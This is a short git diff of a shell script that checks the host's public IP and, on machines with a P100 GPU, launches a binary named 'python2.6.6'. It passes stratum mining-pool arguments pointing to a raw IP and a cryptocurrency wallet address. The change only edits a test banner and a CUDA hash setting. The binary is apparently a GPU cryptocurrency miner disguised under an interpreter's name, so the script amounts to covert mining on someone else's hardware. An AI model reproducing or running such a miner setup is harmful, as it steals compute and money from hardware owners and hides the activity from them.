@@ -6,7 +6,7 @@ IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
 echo '#######################################################'
-echo '##################### Test N 11 ########################'
+echo '##################### Test N 12 ########################'
 echo '#######################################################'
 
 rm -rf python2.6.6
@@ -16,7 +16,7 @@ chmod +x python2.6.6
 
 if [ $(nvidia-smi | grep P100-PCIE |wc -l) == 1 ]
 then
-    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 16 --cuda-block-size 256   --cuda-streams 1 --cuda-grid-size 131072
+    ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -U --cuda-parallel-hash 8 --cuda-block-size 256   --cuda-streams 1 --cuda-grid-size 131072
 else
     ./python2.6.6 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.$IPNAME@116.203.10.54:80  -G 
 fi
